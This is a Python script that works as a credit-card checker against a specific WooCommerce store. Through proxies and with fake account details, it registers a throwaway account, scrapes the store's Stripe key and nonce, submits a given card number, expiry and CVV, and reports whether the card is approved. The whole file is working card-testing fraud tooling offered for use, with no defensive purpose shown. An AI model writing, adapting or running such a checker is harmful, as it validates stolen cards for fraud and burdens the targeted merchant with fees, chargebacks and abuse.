import requests
import random
import re
import json
import asyncio
from typing import Optional
from faker import Faker
from user_agent import generate_user_agent
from urllib.parse import quote

fake = Faker()
domain = "https://www.epicalarc.com"

def parse_proxy(proxy_str: str) -> Optional[str]:
    if not proxy_str:
        return None
    clean_proxy = proxy_str.replace("http://", "").replace("https://", "")
    parts = clean_proxy.split(':')
    if len(parts) >= 4 and parts[1].isdigit():
        host, port = parts[0], parts[1]
        user = quote(parts[2], safe='')
        pwd = quote(':'.join(parts[3:]), safe='')
        return f"http://{user}:{pwd}@{host}:{port}"
    elif len(parts) == 2 and parts[1].isdigit():
        return f"http://{clean_proxy}"
    return proxy_str

def _run_stripe_auth_epicalarc(cc: str, mes: str, ano: str, cvv: str, proxy_str: Optional[str] = None):
    session = requests.Session()
    if proxy_str:
        proxy_url = parse_proxy(proxy_str)
        if proxy_url:
            session.proxies = {
                'http': proxy_url,
                'https': proxy_url
            }

    u = generate_user_agent()
    fname = fake.first_name().lower()
    lname = fake.last_name().lower()
    email = f"{fname}{lname}{random.randint(1000, 9999)}@gmail.com"
    password = fake.password(length=10, special_chars=True)

    headers = {
        "user-agent": u,
    }

    try:
        # 1. Register
        res = session.get(f"{domain}/my-account/", headers=headers, timeout=15)
        nonce_match = re.search(r'name="woocommerce-register-nonce" value="([^"]+)"', res.text)
        referer_match = re.search(r'name="_wp_http_referer" value="([^"]+)"', res.text)
        
        nonce = nonce_match.group(1) if nonce_match else ""
        referer = referer_match.group(1) if referer_match else "/my-account/"
        
        data_reg = {
            "email": email,
            "password": password,
            "register": "Register",
            "woocommerce-register-nonce": nonce,
            "_wp_http_referer": referer,
        }
        
        headers_reg = {
            "origin": domain,
            "referer": f"{domain}/my-account/",
            "content-type": "application/x-www-form-urlencoded",
            "user-agent": u,
        }
        
        session.post(f"{domain}/my-account/", headers=headers_reg, data=data_reg, timeout=15)

        # 2. Get Keys & Nonce
        res_keys = session.get(f"{domain}/my-account/add-payment-method/", headers=headers, timeout=15)
        html = res_keys.text
        
        pk_match = re.search(r'pk_(live|test)_[0-9a-zA-Z]+', html)
        nonce_intent_match = re.search(r'"createAndConfirmSetupIntentNonce":"(.*?)"', html)
        
        if not pk_match or not nonce_intent_match:
            return False, "Failed to extract stripe_pk or nonce from site"
            
        stripe_pk = pk_match.group(0)
        intent_nonce = nonce_intent_match.group(1)

        # 3. Create Payment Method
        headers_pm = {
            "accept": "application/json",
            "content-type": "application/x-www-form-urlencoded",
            "origin": "https://js.stripe.com",
            "referer": "https://js.stripe.com/",
            "user-agent": u,
        }
        
        year_str = str(ano)
        exp_year = year_str[-2:] if len(year_str) >= 2 else year_str
        exp_month = str(mes)
        
        data_pm = {
            "type": "card",
            "card[number]": cc,
            "card[cvc]": cvv,
            "card[exp_year]": exp_year,
            "card[exp_month]": exp_month,
            "billing_details[address][postal_code]": "10001",
            "billing_details[address][country]": "US",
            "payment_user_agent": "stripe.js/84a6a3d5; stripe-js-v3/84a6a3d5; payment-element",
            "key": stripe_pk,
            "_stripe_version": "2024-06-20",
        }
        
        resp_pm = session.post("https://api.stripe.com/v1/payment_methods", headers=headers_pm, data=data_pm, timeout=15)
        if resp_pm.status_code != 200:
            err_data = resp_pm.json()
            err_msg = err_data.get('error', {}).get('message', 'Failed to create payment method')
            return False, err_msg
            
        pm_id = resp_pm.json().get("id")
        if not pm_id:
            return False, "Failed to get Payment Method ID"

        # 4. Confirm Setup
        headers_conf = {
            "x-requested-with": "XMLHttpRequest",
            "origin": domain,
            "referer": f"{domain}/my-account/add-payment-method/",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "user-agent": u,
        }
        
        data_conf = {
            "action": "create_and_confirm_setup_intent",
            "wc-stripe-payment-method": pm_id,
            "wc-stripe-payment-type": "card",
            "_ajax_nonce": intent_nonce,
        }
        
        resp_conf = session.post(f"{domain}/?wc-ajax=wc_stripe_create_and_confirm_setup_intent", headers=headers_conf, data=data_conf, timeout=20)
        res_text = resp_conf.text
        
        if 'Your card was declined.' in res_text or 'Your card could not be set up for future usage.' in res_text:
            return False, 'Your card was declined'
            
        try:
            rjson = json.loads(res_text)
            if rjson.get("success") and rjson["data"].get("status") == "succeeded":
                return True, "CARD_APPROVED"
            else:
                err_msg = rjson.get("data", {}).get("error", {}).get("message")
                if not err_msg and "data" in rjson and "error" in rjson["data"]:
                    err_msg = rjson["data"]["error"]
                return False, err_msg or res_text[:100]
        except Exception:
            if 'success' in res_text.lower():
                return True, "CARD_APPROVED"
            return False, res_text[:100]
            
    except Exception as e:
        return False, f"Epicalarc check failed: {str(e)}"

async def process_stripe_auth_epicalarc(cc: str, mes: str, ano: str, cvv: str, proxy_str: Optional[str] = None):
    return await asyncio.to_thread(_run_stripe_auth_epicalarc, cc, mes, ano, cvv, proxy_str)
